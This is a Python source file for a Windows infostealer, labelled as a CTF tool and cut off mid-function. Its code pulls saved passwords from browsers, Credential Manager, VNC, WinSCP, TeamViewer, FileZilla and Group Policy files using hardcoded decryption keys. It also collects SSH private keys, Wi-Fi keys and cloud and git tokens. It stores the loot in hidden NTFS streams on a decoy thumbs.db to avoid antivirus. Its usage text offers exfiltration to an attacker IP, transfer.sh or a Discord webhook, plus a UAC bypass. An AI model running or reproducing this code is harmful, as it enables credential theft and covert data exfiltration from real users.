#!/usr/bin/env python3
"""
CTF Hunter — credential extractor, browser decryptor, session token grabber,
             keylogger and clipboard monitor for Windows CTF challenges.

Dependencies:  pip install pycryptodome pynput requests
Run as the target user (DPAPI requires the correct user context).

Usage:
    python ctf_hunter.py                                     # dump credentials + sessions
    python ctf_hunter.py --exfil http://YOUR_IP:8000        # direct POST to receive.py
    python ctf_hunter.py --transfer                          # upload to transfer.sh (prints URL)
    python ctf_hunter.py --transfer http://YOUR_IP:8000     # upload to transfer.sh, notify server with URL
    python ctf_hunter.py --discord https://discord.com/api/webhooks/ID/TOKEN
    python ctf_hunter.py --monitor                           # start keylogger + clipboard in background
    python ctf_hunter.py --all                               # everything
    python ctf_hunter.py --elevate                           # UAC bypass (fodhelper), re-runs script elevated
    python ctf_hunter.py --elevate --exfil http://IP:8000   # elevate then run full collection + exfil
"""

import os, re, sys, json, base64, shutil, sqlite3, struct, ctypes, ctypes.wintypes as wt
import tempfile, argparse, threading, time, platform, socket, subprocess
from pathlib import Path
from datetime import datetime, timedelta

# ── CONFIG ─────────────────────────────────────────────────────────────────────
# All output is written as NTFS Alternate Data Streams attached to a single
# decoy file.  The file itself looks like a Windows thumbnail cache; the
# streams are completely invisible to Explorer, 'dir', and most AV dashboards.
# Deleting the host file removes every stream in one atomic operation.
_INETCACHE_DIR = Path(os.environ.get("LOCALAPPDATA", "C:\\Users\\Public")) \
                 / "Microsoft" / "Windows" / "INetCache" / "IE"
_INETCACHE_DIR.mkdir(parents=True, exist_ok=True)
ADS_HOST = _INETCACHE_DIR / "thumbs.db"   # decoy file — looks like a thumbnail cache

# Create the host file with a few null bytes so it resembles a real thumbs.db
if not ADS_HOST.exists():
    ADS_HOST.write_bytes(b"\x00" * 512)

def _hide(path):
    """Set HIDDEN | SYSTEM attributes (applies to file, not individual streams)."""
    try:
        ctypes.windll.kernel32.SetFileAttributesW(str(path), 0x02 | 0x04)
    except Exception:
        pass

_hide(ADS_HOST)

# ADS stream names → friendly filenames used when zipping for exfil
ADS_STREAMS = {
    "cr": "credentials.txt",
    "bp": "browser_passwords.txt",
    "bh": "browser_history.txt",
    "bc": "browser_history.csv",
    "ss": "sessions_and_tokens.txt",
    "wl": "wallets.txt",
    "cl": "clipboard.txt",
}

def _ads(stream: str) -> str:
    """Return the full ADS path for a given stream name, e.g. thumbs.db:cr"""
    return f"{ADS_HOST}:{stream}"

EXFIL_URL = ""   # set via --exfil

# ── HELPERS ────────────────────────────────────────────────────────────────────
def log(path, text):
    # path may be an ADS string like "C:\...\thumbs.db:cr" — don't wrap in Path()
    with open(str(path), "a", encoding="utf-8") as f:
        f.write(text + "\n")

def banner(title):
    line = "\n" + "="*60 + f"\n  {title}\n" + "="*60
    print(line)
    return line

def sep(title=""):
    return f"\n{'─'*60}\n  {title}" if title else "─"*60

def now():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def expand(p):
    return Path(os.path.expandvars(str(p)))

def safe_read(path, maxbytes=512*1024):
    try:
        p = Path(path)
        if not p.is_file(): return None
        raw = p.read_bytes()[:maxbytes]
        try:    return raw.decode("utf-8")
        except: return raw.decode("latin-1", errors="replace")
    except: return None

def safe_bytes(path, maxbytes=10*1024*1024):
    try:
        p = Path(path)
        if not p.is_file(): return None
        return p.read_bytes()[:maxbytes]
    except: return None

def copy_temp(src):
    try:
        dst = Path(tempfile.gettempdir()) / f"ctf_{Path(src).stem}_{os.getpid()}.tmp"
        shutil.copy2(src, dst)
        return dst
    except: return None

def printable_strings(data: bytes, minlen=8):
    return [m.group(0).decode("ascii") for m in re.finditer(rb'[ -~]{' + str(minlen).encode() + rb',}', data)]

# ── DPAPI ──────────────────────────────────────────────────────────────────────
class _BLOB(ctypes.Structure):
    _fields_ = [("cbData", wt.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]

def dpapi_decrypt(blob: bytes) -> bytes | None:
    try:
        inp = _BLOB(len(blob), ctypes.cast(ctypes.c_char_p(blob), ctypes.POINTER(ctypes.c_char)))
        out = _BLOB()
        ok  = ctypes.windll.crypt32.CryptUnprotectData(
                ctypes.byref(inp), None, None, None, None, 0, ctypes.byref(out))
        if ok:
            result = ctypes.string_at(out.pbData, out.cbData)
            ctypes.windll.kernel32.LocalFree(out.pbData)
            return result
    except: pass
    return None

# ── CHROME / EDGE / BRAVE AES-GCM ──────────────────────────────────────────────
def chrome_master_key(user_data: Path) -> bytes | None:
    try:
        ls  = json.loads((user_data / "Local State").read_text(encoding="utf-8"))
        enc = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]  # strip b"DPAPI"
        return dpapi_decrypt(enc)
    except: return None

def chrome_decrypt(blob: bytes, key: bytes | None) -> str:
    if not blob: return ""
    if blob[:3] in (b"v10", b"v11", b"v20"):
        if not key: return f"[encrypted v10/v11 — no master key]"
        try:
            from Crypto.Cipher import AES
            nonce = blob[3:15]; payload = blob[15:]
            c = AES.new(key, AES.MODE_GCM, nonce=nonce)
            return c.decrypt(payload[:-16]).decode("utf-8", errors="replace")
        except ImportError:
            return "[install pycryptodome: pip install pycryptodome]"
        except Exception as e:
            return f"[decrypt error: {e}]"
    raw = dpapi_decrypt(blob)
    if raw:
        try:    return raw.decode("utf-16-le")
        except: return raw.decode("utf-8", errors="replace")
    return "[dpapi failed]"

def open_sqlite(path) -> sqlite3.Connection | None:
    tmp = copy_temp(path)
    if not tmp: return None
    try:
        conn = sqlite3.connect(str(tmp))
        conn._tmp_path = str(tmp)           # attach for cleanup
        return conn
    except: return None

def close_sqlite(conn):
    try:
        conn.close()
        Path(conn._tmp_path).unlink(missing_ok=True)
    except: pass

# ── FIREFOX NSS DECRYPTION ─────────────────────────────────────────────────────
class _SECItem(ctypes.Structure):
    _fields_ = [("type", ctypes.c_uint), ("data", ctypes.c_char_p), ("len", ctypes.c_uint)]

_nss_lib = None

def _load_nss():
    global _nss_lib
    if _nss_lib: return _nss_lib
    for ff in [r"C:\Program Files\Mozilla Firefox",
               r"C:\Program Files (x86)\Mozilla Firefox"]:
        nss3 = os.path.join(ff, "nss3.dll")
        if not os.path.exists(nss3): continue
        try:
            # Load supporting DLLs first
            for dll in ["mozglue.dll", "msvcp140.dll", "vcruntime140.dll"]:
                try: ctypes.CDLL(os.path.join(ff, dll))
                except: pass
            _nss_lib = (ctypes.CDLL(nss3), ff)
            return _nss_lib
        except: pass
    return None

def firefox_decrypt_password(enc_b64: str, profile_path: str) -> str:
    pair = _load_nss()
    if not pair: return f"[nss3.dll not found] raw={enc_b64[:40]}"
    nss, ff_dir = pair
    try:
        old_cwd = os.getcwd(); os.chdir(ff_dir)
        nss.NSS_Init.restype  = ctypes.c_int
        nss.NSS_Init.argtypes = [ctypes.c_char_p]
        if nss.NSS_Init(profile_path.encode("utf-8")) != 0:
            os.chdir(old_cwd)
            return "[NSS_Init failed]"
        slot = nss.PK11_GetInternalKeySlot()
        nss.PK11_CheckUserPassword(slot, b"")   # try empty master password
        data = base64.b64decode(enc_b64)
        inp  = _SECItem(0, data, len(data))
        out  = _SECItem()
        nss.PK11SDR_Decrypt.argtypes = [ctypes.POINTER(_SECItem), ctypes.POINTER(_SECItem), ctypes.c_void_p]
        nss.PK11SDR_Decrypt.restype  = ctypes.c_int
        if nss.PK11SDR_Decrypt(ctypes.byref(inp), ctypes.byref(out), None) == 0:
            result = ctypes.string_at(out.data, out.len).decode("utf-8", errors="replace")
            os.chdir(old_cwd)
            return result
        os.chdir(old_cwd)
        return "[NSS decrypt failed — may have master password]"
    except Exception as e:
        try: os.chdir(old_cwd)
        except: pass
        return f"[nss error: {e}]"


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE 1 — CREDENTIALS
# ══════════════════════════════════════════════════════════════════════════════
def collect_credentials() -> str:
    out = [banner("CREDENTIALS")]

    # ── Windows Credential Manager ────────────────────────────────────────────
    out.append(sep("Windows Credential Manager"))
    try:
        import ctypes
        class FILETIME(ctypes.Structure):
            _fields_ = [("lo", wt.DWORD), ("hi", wt.DWORD)]
        class CRED(ctypes.Structure):
            _fields_ = [("Flags",wt.DWORD),("Type",wt.DWORD),("TargetName",wt.LPWSTR),
                        ("Comment",wt.LPWSTR),("LastWritten",FILETIME),
                        ("CredentialBlobSize",wt.DWORD),("CredentialBlob",ctypes.POINTER(wt.BYTE)),
                        ("Persist",wt.DWORD),("AttributeCount",wt.DWORD),("Attributes",ctypes.c_void_p),
                        ("TargetAlias",wt.LPWSTR),("UserName",wt.LPWSTR)]
        count = wt.DWORD(0); pcreds = ctypes.c_void_p()
        adv = ctypes.windll.advapi32
        if adv.CredEnumerateW(None, 0, ctypes.byref(count), ctypes.byref(pcreds)):
            arr = ctypes.cast(pcreds, ctypes.POINTER(ctypes.POINTER(CRED)))
            for i in range(count.value):
                c = arr[i].contents
                pw = ""
                if c.CredentialBlobSize > 0 and c.CredentialBlob:
                    blob = bytes(c.CredentialBlob[:c.CredentialBlobSize])
                    try:    pw = blob.decode("utf-16-le")
                    except: pw = blob.hex()
                out.append(f"  Target   : {c.TargetName}")
                out.append(f"  Username : {c.UserName}")
                out.append(f"  Password : {pw}\n")
            adv.CredFree(pcreds)
    except Exception as e:
        out.append(f"  [error: {e}]")

    # ── Registry (AutoLogon, VNC, PuTTY, WinSCP) ─────────────────────────────
    out.append(sep("Registry"))
    import winreg

    def rget(hive, path, name):
        try:
            k = winreg.OpenKey(hive, path, 0, winreg.KEY_READ)
            v, _ = winreg.QueryValueEx(k, name); winreg.CloseKey(k); return str(v)
        except: return None

    def rall(hive, path):
        try:
            k = winreg.OpenKey(hive, path, 0, winreg.KEY_READ)
            i = 0; vals = {}
            while True:
                try: n, d, _ = winreg.EnumValue(k, i); vals[n]=d; i+=1
                except OSError: break
            winreg.CloseKey(k); return vals
        except: return {}

    def rsubkeys(hive, path):
        try:
            k = winreg.OpenKey(hive, path, 0, winreg.KEY_READ)
            i = 0; keys = []
            while True:
                try: keys.append(winreg.EnumKey(k, i)); i+=1
                except OSError: break
            winreg.CloseKey(k); return keys
        except: return []

    # AutoLogon
    wl = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    for n in ["DefaultPassword", "AltDefaultPassword"]:
        v = rget(winreg.HKEY_LOCAL_MACHINE, wl, n)
        if v:
            u = rget(winreg.HKEY_LOCAL_MACHINE, wl, "DefaultUserName") or ""
            out.append(f"  AutoLogon  User={u}  Pass={v}")

    # VNC (DES with known key)
    _VNC_KEY = bytes([0xe8,0x4a,0xd6,0x60,0xc4,0x72,0x1a,0xe0])
    def vnc_decrypt(val):
        try:
            from Crypto.Cipher import DES
            enc = bytes.fromhex(str(val).strip()) if isinstance(val,str) else bytes(val)
            return DES.new(_VNC_KEY, DES.MODE_ECB).decrypt(enc[:8]).decode("ascii","replace").rstrip("\x00")
        except: return str(val)

    for path in [r"SOFTWARE\RealVNC\vncserver", r"SOFTWARE\TightVNC\Server",
                 r"SOFTWARE\TigerVNC\WinVNC4", r"SOFTWARE\ORL\WinVNC3"]:
        for h in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
            for n in ["Password","PasswordViewOnly"]:
                v = rget(h, path, n)
                if v: out.append(f"  VNC  {path}\\{n} = {vnc_decrypt(v)}")

    # PuTTY sessions
    for sk in rsubkeys(winreg.HKEY_CURRENT_USER, r"Software\SimonTatham\PuTTY\Sessions"):
        vals = rall(winreg.HKEY_CURRENT_USER, f"Software\\SimonTatham\\PuTTY\\Sessions\\{sk}")
        if vals.get("HostName") or vals.get("UserName"):
            out.append(f"  PuTTY [{sk}]  Host={vals.get('HostName','')}  "
                       f"User={vals.get('UserName','')}  ProxyPass={vals.get('ProxyPassword','')}")

    # WinSCP sessions (XOR obfuscation)
    def winscp_decrypt(pw, host="", user=""):
        try:
            MAGIC=0xA3; nibbles=[int(c,16) for c in pw.strip()]
            i=0
            def rb():
                nonlocal i; b=MAGIC^(nibbles[i]<<4|nibbles[i+1]); i+=2; return (~b)&0xFF
            flag=rb()
            if flag==0xFF: rb(); length=rb()
            else: length=flag
            rb(); rb()
            r="".join(chr(rb()) for _ in range(length))
            pfix=host+user
            return r[len(pfix):] if pfix and r.startswith(pfix) else r
        except: return pw

    for sk in rsubkeys(winreg.HKEY_CURRENT_USER, r"Software\Martin Prikryl\WinSCP 2\Sessions"):
        vals = rall(winreg.HKEY_CURRENT_USER, f"Software\\Martin Prikryl\\WinSCP 2\\Sessions\\{sk}")
        pw   = vals.get("Password","")
        if pw:
            dec = winscp_decrypt(pw, vals.get("HostName",""), vals.get("UserName",""))
            out.append(f"  WinSCP [{sk}]  Host={vals.get('HostName','')}  "
                       f"User={vals.get('UserName','')}  Pass={dec}")

    # ── Config files with credentials ─────────────────────────────────────────
    out.append(sep("Config Files"))
    cred_re = re.compile(
        r'(?i)(?:password|passwd|pwd|secret|api[_-]?key|token|auth)\s*[=:]\s*["\']?([^\s"\'<>,;\r\n]{4,})')

    config_names = {
        "web.config","appsettings.json","appsettings.production.json",
        "wp-config.php","config.php","settings.py","local_settings.py",
        "database.yml","secrets.yml",".env","application.properties",
        "application.yml","config.json","parameters.yml","parameters.json",
        ".htpasswd","shadow","passwd"
    }

    search_roots = [
        r"%USERPROFILE%", r"C:\inetpub", r"C:\xampp", r"C:\wamp64",
        r"C:\nginx", r"C:\Apache24", r"C:\Windows\Panther",
    ]

    for root in search_roots:
        r = expand(root)
        if not r.exists(): continue
        for p in r.rglob("*"):
            try:
                if not p.is_file() or p.stat().st_size > 512*1024: continue
                if p.name.lower() not in config_names and p.suffix.lower() not in \
                   {".env",".cfg",".conf",".config",".ini"}: continue
                content = safe_read(p)
                if not content: continue
                for m in cred_re.finditer(content):
                    out.append(f"  [{p}]  {m.group(0).strip()}")
            except: continue

    # ── Files named password/credentials/secret ────────────────────────────────
    out.append(sep("Files Named password/credentials/secrets"))
    name_re = re.compile(r'(?i)(password|credential|secret|passwd|creds|apikey|token)', re.I)

    for root in [expand(r"%USERPROFILE%"), Path("C:\\")]:
        if not root.exists(): continue
        try:
            for p in root.rglob("*"):
                try:
                    if not p.is_file(): continue
                    if not name_re.search(p.stem): continue
                    if p.suffix.lower() not in {".txt",".json",".xml",".ini",".cfg",
                                                ".conf",".csv","",".md",".log",".ps1",
                                                ".bat",".sh",".py",".php"}: continue
                    if p.stat().st_size > 1024*1024: continue
                    content = safe_read(p)
                    if content and content.strip():
                        out.append(f"  [{p}]\n{content[:800]}\n")
                except: continue
        except: continue

    # ── SSH keys ──────────────────────────────────────────────────────────────
    out.append(sep("SSH Keys"))
    for root in [expand(r"%USERPROFILE%\.ssh"), Path(r"C:\ProgramData\ssh")]:
        if not root.exists(): continue
        for p in root.rglob("*"):
            try:
                if not p.is_file() or p.stat().st_size > 16*1024: continue
                content = safe_read(p)
                if not content: continue
                if "PRIVATE KEY" in content:
                    out.append(f"  [PRIVATE KEY] {p}\n{content[:1200]}")
                elif p.name == "config":
                    out.append(f"  [SSH CONFIG] {p}\n{content}")
                elif p.name in ("known_hosts", "authorized_keys") or p.suffix == ".pub":
                    out.append(f"  [{p.name}] {p}\n{content[:400]}")
            except: continue

    # ── PowerShell / ConsoleHost history ──────────────────────────────────────
    out.append(sep("PowerShell History"))
    for path in [
        r"%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
        r"%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\Visual Studio Code Host_history.txt",
    ]:
        content = safe_read(expand(path), 256*1024)
        if content:
            out.append(f"  [{path}]\n{content}")

    # ── GPP cpassword ─────────────────────────────────────────────────────────
    out.append(sep("GPP cpassword (MS14-025)"))
    GPP_KEY = bytes([0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                     0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b])
    def gpp_decrypt(cpw):
        try:
            from Crypto.Cipher import AES
            enc = base64.b64decode(cpw + "=" * (-len(cpw)%4))
            c   = AES.new(GPP_KEY, AES.MODE_CBC, b'\x00'*16)
            dec = c.decrypt(enc); pad=dec[-1]
            return dec[:-pad].decode("utf-16-le")
        except: return f"[decrypt failed] raw={cpw}"

    for root in [Path(r"C:\Windows\SYSVOL"), Path(r"C:\Windows\Panther")]:
        if not root.exists(): continue
        for fname in ["Groups.xml","Services.xml","ScheduledTasks.xml","DataSources.xml"]:
            for p in root.rglob(fname):
                content = safe_read(p)
                if not content: continue
                for m in re.finditer(r'cpassword="([^"]+)"', content, re.I):
                    user = (re.search(r'userName="([^"]+)"', content) or type("x",(),{"group":lambda s,n:""})()).group(1)
                    out.append(f"  [{p}]  User={user}  Pass={gpp_decrypt(m.group(1))}")

    # ── Wi-Fi saved passwords ─────────────────────────────────────────────────
    out.append(sep("Wi-Fi Saved Passwords"))
    try:
        profiles_raw = subprocess.check_output(
            ["netsh", "wlan", "show", "profiles"],
            stderr=subprocess.DEVNULL, timeout=10
        ).decode(errors="replace")
        ssids = re.findall(r"All User Profile\s*:\s*(.+)", profiles_raw)
        for ssid in ssids:
            ssid = ssid.strip()
            try:
                detail = subprocess.check_output(
                    ["netsh", "wlan", "show", "profile", f"name={ssid}", "key=clear"],
                    stderr=subprocess.DEVNULL, timeout=10
                ).decode(errors="replace")
                m = re.search(r"Key Content\s*:\s*(.+)", detail)
                pw = m.group(1).strip() if m else "(no password / enterprise auth)"
                out.append(f"  SSID: {ssid}  |  Password: {pw}")
            except: continue
    except: pass

    # ── Environment variables ─────────────────────────────────────────────────
    out.append(sep("Environment Variables"))
    for k, v in sorted(os.environ.items()):
        out.append(f"  {k}={v}")
    # Also pull System-level env vars from registry (may differ from user env)
    sys_env = rall(winreg.HKEY_LOCAL_MACHINE,
                   r"SYSTEM\CurrentControlSet\Control\Session Manager\Environment")
    if sys_env:
        out.append("  [System environment]")
        for k, v in sorted(sys_env.items()):
            out.append(f"    {k}={v}")

    # ── Windows Sticky Notes ──────────────────────────────────────────────────
    out.append(sep("Sticky Notes"))
    sticky_db = expand(
        r"%LOCALAPPDATA%\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe"
        r"\LocalState\plum.sqlite")
    if sticky_db.exists():
        conn = open_sqlite(sticky_db)
        if conn:
            try:
                for (text,) in conn.execute(
                        "SELECT Text FROM Note WHERE IsDeleted=0"):
                    if text and text.strip():
                        out.append(f"  [StickyNote]\n{text[:800]}\n")
            except Exception as e:
                out.append(f"  [error: {e}]")
            finally: close_sqlite(conn)
    # Older Windows 10 plain-text sticky notes
    sticky_old = expand(r"%APPDATA%\Microsoft\Sticky Notes\StickyNotes.snt")
    content = safe_read(sticky_old)
    if content:
        out.append(f"  [Legacy StickyNotes.snt]\n{content[:2000]}")

    # ── FileZilla ─────────────────────────────────────────────────────────────
    out.append(sep("FileZilla"))
    for fname in ["recentservers.xml", "sitemanager.xml"]:
        p = expand(rf"%APPDATA%\FileZilla\{fname}")
        content = safe_read(p)
        if not content: continue
        out.append(f"  [{p}]")
        # Passwords are base64-encoded in <Pass encoding="base64">
        for m in re.finditer(r'<Pass[^>]*encoding="base64"[^>]*>([^<]+)</Pass>', content, re.I):
            try:    pw = base64.b64decode(m.group(1)).decode("utf-8", errors="replace")
            except: pw = m.group(1)
            host = (re.search(r'<Host>([^<]+)</Host>', content) or
                    type("x",(),{"group":lambda s,n:""})()).group(1)
            user = (re.search(r'<User>([^<]+)</User>', content) or
                    type("x",(),{"group":lambda s,n:""})()).group(1)
            out.append(f"  Host={host}  User={user}  Pass={pw}")

    # ── Git credentials ───────────────────────────────────────────────────────
    out.append(sep("Git Credentials"))
    for p in [expand(r"%USERPROFILE%\.git-credentials"),
              expand(r"%USERPROFILE%\.gitconfig"),
              expand(r"%APPDATA%\Git\config")]:
        content = safe_read(p)
        if content:
            out.append(f"  [{p}]\n{content[:1000]}")
    # Git credential helper store (tokens in URL form: https://user:token@github.com)
    for m in re.finditer(r'https?://[^@\s]+:[^@\s]+@\S+',
                         safe_read(expand(r"%USERPROFILE%\.git-credentials")) or ""):
        out.append(f"  [GIT TOKEN] {m.group(0)}")

    # ── Docker ───────────────────────────────────────────────────────────────
    out.append(sep("Docker Credentials"))
    docker_cfg = expand(r"%USERPROFILE%\.docker\config.json")
    content = safe_read(docker_cfg)
    if content:
        out.append(f"  [{docker_cfg}]")
        try:
            d = json.loads(content)
            for registry, auth in d.get("auths", {}).items():
                enc = auth.get("auth", "")
                if enc:
                    try:    decoded = base64.b64decode(enc).decode("utf-8", errors="replace")
                    except: decoded = enc
                    out.append(f"  Registry={registry}  Auth={decoded}")
        except: out.append(content[:600])

    # ── kubectl config ────────────────────────────────────────────────────────
    out.append(sep("kubectl / Kubernetes"))
    for p in [expand(r"%USERPROFILE%\.kube\config"),
              expand(r"%USERPROFILE%\.kube\config.bak")]:
        content = safe_read(p)
        if content:
            out.append(f"  [{p}]\n{content[:2000]}")

    # ── RDP saved connections ─────────────────────────────────────────────────
    out.append(sep("RDP Saved Connections"))
    for sk in rsubkeys(winreg.HKEY_CURRENT_USER,
                       r"Software\Microsoft\Terminal Server Client\Servers"):
        vals = rall(winreg.HKEY_CURRENT_USER,
                    f"Software\\Microsoft\\Terminal Server Client\\Servers\\{sk}")
        out.append(f"  RDP Server={sk}  User={vals.get('UsernameHint','')}")
    # .rdp files
    for root in [expand(r"%USERPROFILE%\Documents"), expand(r"%USERPROFILE%\Desktop")]:
        if not root.exists(): continue
        for p in root.rglob("*.rdp"):
            content = safe_read(p)
            if content:
                out.append(f"  [{p}]\n{content[:600]}")

    # ── TeamViewer ────────────────────────────────────────────────────────────
    out.append(sep("TeamViewer"))
    for reg_path in [r"SOFTWARE\WOW6432Node\TeamViewer", r"SOFTWARE\TeamViewer"]:
        for h in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
            vals = rall(h, reg_path)
            for key in ["SecurityPasswordAES", "OptionsPasswordAES", "ServerPasswordAES"]:
                v = vals.get(key)
                if v:
                    # TeamViewer AES-128-CBC, key = fixed bytes, IV = fixed bytes
                    try:
                        from Crypto.Cipher import AES as _AES
                        _tv_key = bytes([0x06,0x02,0x00,0x00,0x00,0xa4,0x00,0x00,
                                         0x52,0x53,0x41,0x31,0x00,0x04,0x00,0x00])
                        _tv_iv  = bytes([0x01]+[0x00]*15)
                        enc = bytes(v) if not isinstance(v, bytes) else v
                        dec = _AES.new(_tv_key, _AES.MODE_CBC, _tv_iv).decrypt(enc)
                        pw  = dec.rstrip(b"\x00").decode("utf-16-le", errors="replace")
                    except: pw = str(v)
                    out.append(f"  [{reg_path}\\{key}] {pw}")

    # ── Windows DPAPI credential blobs ────────────────────────────────────────
    out.append(sep("Windows DPAPI Credential Blobs"))
    for cred_dir in [
        expand(r"%APPDATA%\Microsoft\Credentials"),
        expand(r"%LOCALAPPDATA%\Microsoft\Credentials"),
    ]:
        if not cred_dir.exists(): continue
        for p in cred_dir.iterdir():
            if not p.is_file(): continue
            raw = safe_bytes(p)
            if not raw: continue
            dec = dpapi_decrypt(raw)
            if dec:
                try:    readable = dec.decode("utf-16-le", errors="replace")
                except: readable = dec.decode("latin-1", errors="replace")
                out.append(f"  [{p.name}] {readable[:400]}")
            else:
                out.append(f"  [{p.name}] (DPAPI blob — {len(raw)} bytes, decrypt failed)")

    # ── MobaXterm ─────────────────────────────────────────────────────────────
    out.append(sep("MobaXterm"))
    mobaxterm_ini = expand(r"%APPDATA%\MobaXterm\MobaXterm.ini")
    content = safe_read(mobaxterm_ini)
    if content:
        out.append(f"  [{mobaxterm_ini}]\n{content[:3000]}")

    # ── npm / pip / composer tokens ───────────────────────────────────────────
    out.append(sep("Package Manager Tokens"))
    for p in [expand(r"%USERPROFILE%\.npmrc"),
              expand(r"%USERPROFILE%\AppData\Roaming\npm\etc\npmrc"),
              expand(r"%USERPROFILE%\pip\pip.ini"),
              expand(r"%APPDATA%\pip\pip.ini"),
              expand(r"%USERPROFILE%\.pypirc"),
              expand(r"%USERPROFILE%\.composer\auth.json")]:
        content = safe_read(p)
        if content:
            out.append(f"  [{p}]\n{content[:800]}")

    # ── Thunderbird saved passwords ───────────────────────────────────────────
    out.append(sep("Thunderbird"))
    tb_root = expand(r"%APPDATA%\Thunderbird\Profiles")
    if tb_root.exists():
        for profile in tb_root.iterdir():
            lj = profile / "logins.json"
            if not lj.exists(): continue
            out.append(sep(f"Thunderbird — {profile.name}"))
            try:
                data = json.loads(lj.read_text(encoding="utf-8"))
                for login in data.get("logins", []):
                    url  = login.get("hostname", "")
                    user = firefox_decrypt_password(login.get("encryptedUsername",""), str(profile))
                    pw   = firefox_decrypt_password(login.get("encryptedPassword",""), str(profile))
                    out.append(f"  URL={url}  User={user}  Pass={pw}")
            except Exception as e:
                out.append(f"  [error: {e}]")

    # ── Recently opened files (shell:recent) ──────────────────────────────────
    out.append(sep("Recently Opened Files"))
    recent = expand(r"%APPDATA%\Microsoft\Windows\Recent")
    if recent.exists():
        items = sorted(recent.glob("*.lnk"), key=lambda p: p.stat().st_mtime, reverse=True)
        for lnk in items[:50]:
            out.append(f"  {lnk.stem}")

    # ── Unattend.xml ──────────────────────────────────────────────────────────
    out.append(sep("Unattend / Sysprep"))
    for path in [r"C:\Windows\Panther\Unattend.xml",
                 r"C:\Windows\system32\sysprep\unattend.xml",
                 r"C:\unattend.xml", r"C:\autounattend.xml"]:
        content = safe_read(path)
        if not content: continue
        for m in re.finditer(r'<Value>([^<]+)</Value>', content, re.I):
            val = m.group(1).strip()
            out.append(f"  [{path}]  raw={val}")
            try:
                dec = base64.b64decode(val + "==").decode("utf-16-le")
                out.append(f"  [{path}]  decoded={dec}")
            except: pass

    text = "\n".join(out)
    log(_ads("cr"), text)
    return text


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE 2 — BROWSER PASSWORDS + HISTORY
# ══════════════════════════════════════════════════════════════════════════════
CHROMIUM_PROFILES = [
    (r"%LOCALAPPDATA%\Google\Chrome\User Data",               "Chrome"),
    (r"%LOCALAPPDATA%\Microsoft\Edge\User Data",              "Edge"),
    (r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data", "Brave"),
    (r"%APPDATA%\Opera Software\Opera Stable",                "Opera"),
    (r"%LOCALAPPDATA%\Vivaldi\User Data",                     "Vivaldi"),
]

def _chromium_profile_dirs(user_data: Path):
    dirs = [user_data / "Default"]
    dirs += list(user_data.glob("Profile *"))
    return [d for d in dirs if d.is_dir()]

def collect_browser_passwords() -> str:
    out = [banner("BROWSER PASSWORDS")]

    # ── Chromium (Chrome / Edge / Brave) ──────────────────────────────────────
    for path, name in CHROMIUM_PROFILES:
        ud = expand(path)
        if not ud.exists(): continue
        mkey = chrome_master_key(ud)
        for profile in _chromium_profile_dirs(ud):
            db_path = profile / "Login Data"
            if not db_path.exists(): continue
            conn = open_sqlite(db_path)
            if not conn: continue
            out.append(sep(f"{name} — {profile.name}"))
            try:
                for url, user, blob in conn.execute(
                        "SELECT origin_url, username_value, password_value FROM logins"):
                    pw = chrome_decrypt(bytes(blob) if blob else b"", mkey)
                    out.append(f"  URL      : {url}")
                    out.append(f"  Username : {user}")
                    out.append(f"  Password : {pw}\n")
            except Exception as e:
                out.append(f"  [error: {e}]")
            finally: close_sqlite(conn)

    # ── Firefox ───────────────────────────────────────────────────────────────
    ff_root = expand(r"%APPDATA%\Mozilla\Firefox\Profiles")
    if ff_root.exists():
        for profile in ff_root.iterdir():
            if not profile.is_dir(): continue
            lj = profile / "logins.json"
            if not lj.exists(): continue
            out.append(sep(f"Firefox — {profile.name}"))
            try:
                data = json.loads(lj.read_text(encoding="utf-8"))
                for login in data.get("logins", []):
                    url  = login.get("hostname","")
                    user = firefox_decrypt_password(login.get("encryptedUsername",""), str(profile))
                    pw   = firefox_decrypt_password(login.get("encryptedPassword",""), str(profile))
                    out.append(f"  URL      : {url}")
                    out.append(f"  Username : {user}")
                    out.append(f"  Password : {pw}\n")
            except Exception as e:
                out.append(f"  [error: {e}]")

    text = "\n".join(out)
    log(_ads("bp"), text)
    return text


def collect_browser_history() -> str:
    out = [banner("BROWSER HISTORY")]
    csv_lines = ["browser,profile,url,title,visit_time,visit_count"]

    # ── Chromium ──────────────────────────────────────────────────────────────
    for path, name in CHROMIUM_PROFILES:
        ud = expand(path)
        if not ud.exists(): continue
        for profile in _chromium_profile_dirs(ud):
            db_path = profile / "History"
            if not db_path.exists(): continue
            conn = open_sqlite(db_path)
            if not conn: continue
            out.append(sep(f"{name} — {profile.name}"))
            try:
                for url, title, count, ts in conn.execute(
                        "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC"):
                    # Chrome timestamps: microseconds since 1601-01-01
                    try:
                        import datetime
                        epoch = datetime.datetime(1601,1,1)
                        dt = (epoch + datetime.timedelta(microseconds=ts)).strftime("%Y-%m-%d %H:%M:%S")
                    except: dt = str(ts)
                    out.append(f"  {dt}  [{count}x]  {url}  {title}")
                    csv_lines.append(f'{name},{profile.name},"{url}","{title}",{dt},{count}')
            except Exception as e:
                out.append(f"  [error: {e}]")
            finally: close_sqlite(conn)

    # ── Firefox ───────────────────────────────────────────────────────────────
    ff_root = expand(r"%APPDATA%\Mozilla\Firefox\Profiles")
    if ff_root.exists():
        for profile in ff_root.iterdir():
            db_path = profile / "places.sqlite"
            if not db_path.exists(): continue
            conn = open_sqlite(db_path)
            if not conn: continue
            out.append(sep(f"Firefox — {profile.name}"))
            try:
                for url, title, count, ts in conn.execute(
                        "SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC"):
                    try:
                        import datetime
